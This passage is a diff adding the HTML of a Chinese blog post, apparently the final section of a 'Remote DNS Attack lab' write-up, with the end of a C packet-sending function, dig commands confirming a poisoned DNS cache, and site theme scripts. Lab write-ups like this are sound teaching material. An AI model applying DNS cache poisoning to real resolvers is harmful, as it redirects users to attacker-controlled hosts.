+       (struct sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));
+    <span class="hljs-built_in">close</span>(sock);
+&#125;</code></pre>
+
+<p>之后进行DNS缓存的存储以及查找对应的条目</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p>
+<p>可以看到对应条目已经出现，成功</p>
+<h4 id="task-7：检查结果"><a href="#task-7：检查结果" class="headerlink" title="task 7：检查结果"></a>task 7：检查结果</h4><p>在用户主机上面分别运行dig命令</p>
+<pre><code class="hljs stylus">dig www<span class="hljs-selector-class">.example</span>.com
+dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com</code></pre>
+
+<p>可以看到对应的结果是一样的，此时DNS本地服务器缓存中毒攻击成功</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/7-1.PNG" srcset="/img/loading.gif" alt="7-1"></p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/7-2.PNG" srcset="/img/loading.gif" alt="7-2"></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/NetWork-Security/">NetWork Security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/19/DNS-Rebinding-Attack-lab/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DNS Rebinding Attack lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/">
+                        <span class="hidden-mobile">电子邮件中DANE生态系统的纵向综合研究</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Remote DNS Attack lab&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
